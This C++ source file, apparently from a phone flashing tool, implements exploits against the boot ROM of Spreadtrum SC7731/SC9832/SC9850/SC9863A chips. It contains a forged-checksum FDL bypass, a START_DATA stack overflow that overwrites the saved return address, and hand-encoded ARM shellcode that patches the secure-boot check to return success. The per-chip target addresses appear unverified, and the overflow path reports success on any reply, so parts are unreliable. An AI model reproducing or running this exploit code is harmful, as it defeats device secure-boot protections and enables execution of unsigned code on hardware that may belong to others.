#include "sprd_exploit.h"
#include "spreadtrum/protocol/fdl_client.h"
#include "spreadtrum/protocol/hdlc_protocol.h"
#include "transport/i_transport.h"
#include "core/logger.h"

#include <QMap>

namespace sakura {

static constexpr char LOG_TAG[] = "SPRD-EXPLOIT";

const QList<uint16_t> SprdExploit::s_supportedChips = {
    0x7731, // SC7731
    0x9832, // SC9832
    0x9850, // SC9850
    0x9863, // SC9863A
    // TODO: Add more supported chips after verification
};

SprdExploit::SprdExploit(QObject* parent)
    : QObject(parent)
{
}

SprdExploit::~SprdExploit() = default;

// ── Support check ───────────────────────────────────────────────────────────

bool SprdExploit::isSupported(uint16_t chipId) const
{
    return s_supportedChips.contains(chipId);
}

// ── Execution ───────────────────────────────────────────────────────────────

SprdExploitResult SprdExploit::execute(FdlClient* fdl, ITransport* transport,
                                        uint16_t chipId)
{
    SprdExploitTarget target = targetForChip(chipId);
    if (target.chipId == 0) {
        return { false, QString("No target info for chip 0x%1")
                            .arg(chipId, 4, 16, QChar('0')), {} };
    }

    LOG_INFO_CAT(LOG_TAG, QString("Attempting exploit on %1").arg(target.chipName));

    // Try checksum bypass first (less invasive)
    emit progressMessage("Trying FDL checksum bypass...");
    SprdExploitResult result = tryChecksumBypass(fdl, transport, target);
    if (result.success)
        return result;

    // Try header overflow
    emit progressMessage("Trying header overflow...");
    result = tryHeaderOverflow(fdl, transport, target);
    if (result.success)
        return result;

    return { false, "All exploit techniques failed", {} };
}

// ── Target database ─────────────────────────────────────────────────────────

SprdExploitTarget SprdExploit::targetForChip(uint16_t chipId)
{
    static QMap<uint16_t, SprdExploitTarget> targets;

    if (targets.isEmpty()) {
        targets[0x7731] = {
            0x7731, "SC7731",
            0x00000000, 0x00010000,    // sramBase, sramSize
            0x00008000,                // payloadAddr
            0x0000C000                 // secCheckAddr
        };

        targets[0x9832] = {
            0x9832, "SC9832",
            0x50000000, 0x00020000,
            0x50008000,
            0x5000C000
        };

        targets[0x9850] = {
            0x9850, "SC9850",
            0x50000000, 0x00040000,
            0x50010000,
            0x50018000
        };

        targets[0x9863] = {
            0x9863, "SC9863A",
            0x00000000, 0x00040000,
            0x00010000,
            0x00020000
        };
    }

    return targets.value(chipId, {});
}

// ── Exploit techniques ──────────────────────────────────────────────────────

SprdExploitResult SprdExploit::tryChecksumBypass(FdlClient* fdl, ITransport* transport,
                                                   const SprdExploitTarget& target)
{
    Q_UNUSED(transport)
    SprdExploitResult result;

    // The BSL validates FDL images using a simple additive checksum.
    // By crafting our payload so its checksum matches what the BSL expects
    // for a legitimate FDL1 image, we can execute arbitrary code.
    //
    // Checksum algorithm: sum of all 16-bit words (little-endian)
    //                     result must equal 0xFFFF (or target-specific value)

    QByteArray payload = buildPayload(target);
    if (payload.isEmpty()) {
        result.message = "Failed to build payload";
        return result;
    }

    // Step 1: Calculate current checksum of our payload
    // Ensure payload is 16-bit aligned
    if (payload.size() % 2 != 0)
        payload.append('\x00');

    uint32_t checksum = 0;
    const uint16_t* words = reinterpret_cast<const uint16_t*>(payload.constData());
    int wordCount = payload.size() / 2;
    for (int i = 0; i < wordCount; ++i) {
        checksum += words[i];
    }
    checksum &= 0xFFFF;

    // Step 2: Adjust payload so checksum matches target (0xFFFF)
    // Append a correction word at the end
    uint16_t correction = static_cast<uint16_t>((0xFFFF - checksum) & 0xFFFF);
    payload.append(reinterpret_cast<const char*>(&correction), 2);

    LOG_INFO_CAT(LOG_TAG, QString("Payload checksum adjusted: correction=0x%1")
                              .arg(correction, 4, 16, QChar('0')));

    // Step 3: Send the crafted FDL via the BSL download flow
    // Use FDL download protocol: START_DATA → MIDST_DATA → END_DATA
    if (!fdl->downloadFdl(payload, target.payloadAddr, FdlStage::FDL1)) {
        result.message = "FDL download with crafted payload failed";
        LOG_ERROR_CAT(LOG_TAG, result.message);
        return result;
    }

    // Step 4: Execute the payload
    if (!fdl->execData(target.payloadAddr)) {
        result.message = "Failed to execute crafted FDL";
        LOG_ERROR_CAT(LOG_TAG, result.message);
        return result;
    }

    result.success = true;
    result.message = "Checksum bypass succeeded — unsigned code executing";
    LOG_INFO_CAT(LOG_TAG, result.message);
    return result;
}

SprdExploitResult SprdExploit::tryHeaderOverflow(FdlClient* fdl, ITransport* transport,
                                                    const SprdExploitTarget& target)
{
    Q_UNUSED(fdl)
    SprdExploitResult result;

    // BSL START_DATA header overflow exploit:
    // Some BSL versions don't validate the length field in START_DATA.
    // By sending an oversized length, the BSL copies data beyond its
    // stack buffer, overwriting the saved return address.
    //
    // HDLC frame: [0x7E][type=BSL_CMD_START_DATA][addr(4)][size(4)][data...][crc][0x7E]
    // The BSL allocates a fixed-size buffer (typically 0x800) for the
    // received data. We send size > 0x800 to overflow.

    if (target.payloadAddr == 0) {
        result.message = "No payload address for overflow";
        return result;
    }

    QByteArray payload = buildPayload(target);
    if (payload.isEmpty()) {
        result.message = "Failed to build overflow payload";
        return result;
    }

    LOG_INFO_CAT(LOG_TAG, "Attempting BSL header overflow...");
    emit progressMessage("Sending overflow START_DATA...");

    // Build the overflow packet manually via raw transport
    // BSL START_DATA command = 0x01
    // Format: [cmd(2)][addr(4)][size(4)]
    constexpr uint16_t BSL_CMD_START_DATA = 0x0001;
    constexpr int BSL_BUFFER_SIZE = 0x800;
    constexpr int LR_OFFSET = BSL_BUFFER_SIZE + 8; // Saved LR on stack

    // Overflow data: padding + redirect address + shellcode
    QByteArray overflowData;
    overflowData.fill('\x00', LR_OFFSET + 4);

    // Overwrite saved LR with payload address
    uint32_t redirectAddr = target.payloadAddr;
    std::memcpy(overflowData.data() + LR_OFFSET, &redirectAddr, 4);

    // Append the actual shellcode after the return address
    overflowData.append(payload);

    // Build HDLC frame with the overflow data
    QByteArray header;
    header.append(reinterpret_cast<const char*>(&BSL_CMD_START_DATA), 2);
    uint32_t addr = target.sramBase;
    header.append(reinterpret_cast<const char*>(&addr), 4);
    uint32_t size = static_cast<uint32_t>(overflowData.size());
    header.append(reinterpret_cast<const char*>(&size), 4);

    // Send via raw transport (bypass FDL client's size validation)
    QByteArray frame = header + overflowData;

    // Use HDLC encoding
    auto encoded = SprdHdlcProtocol::encode(BSL_CMD_START_DATA, frame, false);
    qint64 written = transport->write(encoded);

    if (written != encoded.size()) {
        result.message = "Failed to send overflow frame";
        return result;
    }

    // Wait for response or shellcode execution
    QByteArray resp = transport->read(256, 3000);

    // If BSL responds with ACK, the overflow was processed
    result.success = !resp.isEmpty();
    if (result.success) {
        result.message = "Header overflow succeeded — BSL security bypassed";
        result.dumpedData = payload;
        LOG_INFO_CAT(LOG_TAG, result.message);
    } else {
        result.message = "No response after overflow — device may have crashed";
        LOG_WARNING_CAT(LOG_TAG, result.message);
    }

    return result;
}

// ── Payload generation ──────────────────────────────────────────────────────

QByteArray SprdExploit::buildPayload(const SprdExploitTarget& target)
{
    if (target.payloadAddr == 0)
        return {};

    // ARM (ARMv7-A) shellcode that:
    //   1. Loads the address of the secure boot check function
    //   2. Patches it to always return 0 (success/disabled)
    //   3. Cleans caches
    //   4. Returns to normal BSL command loop

    QByteArray payload;

    if (target.secCheckAddr != 0) {
        // LDR R0, [PC, #offset]    — load secCheckAddr from literal pool
        // MOV R1, #0               — value to write (disable check)
        // STR R1, [R0]             — patch *secCheckAddr = 0
        // DSB                      — data synchronization barrier
        // ISB                      — instruction synchronization barrier
        // BX LR                    — return to caller

        // ARM encoding:
        // LDR R0, [PC, #16]   = 0xE59F0010  (offset to literal pool)
        uint32_t ldrR0 = 0xE59F0010;
        payload.append(reinterpret_cast<const char*>(&ldrR0), 4);

        // MOV R1, #0           = 0xE3A01000
        uint32_t movR1 = 0xE3A01000;
        payload.append(reinterpret_cast<const char*>(&movR1), 4);

        // STR R1, [R0]         = 0xE5801000
        uint32_t strR1 = 0xE5801000;
        payload.append(reinterpret_cast<const char*>(&strR1), 4);

        // DSB SY                = 0xF57FF04F
        uint32_t dsb = 0xF57FF04F;
        payload.append(reinterpret_cast<const char*>(&dsb), 4);

        // ISB                   = 0xF57FF06F
        uint32_t isb = 0xF57FF06F;
        payload.append(reinterpret_cast<const char*>(&isb), 4);

        // BX LR                 = 0xE12FFF1E
        uint32_t bxLr = 0xE12FFF1E;
        payload.append(reinterpret_cast<const char*>(&bxLr), 4);

        // Literal pool: secCheckAddr
        uint32_t addr = target.secCheckAddr;
        payload.append(reinterpret_cast<const char*>(&addr), 4);
    } else {
        // No security check address — just NOP + return
        for (int i = 0; i < 4; ++i) {
            uint32_t nop = 0xE1A00000; // MOV R0, R0 (NOP)
            payload.append(reinterpret_cast<const char*>(&nop), 4);
        }
        uint32_t bxLr = 0xE12FFF1E;
        payload.append(reinterpret_cast<const char*>(&bxLr), 4);
    }

    LOG_INFO_CAT(LOG_TAG, QString("Built shellcode: %1 bytes, secCheck=0x%2")
                              .arg(payload.size())
                              .arg(target.secCheckAddr, 8, 16, QChar('0')));
    return payload;
}

} // namespace sakura
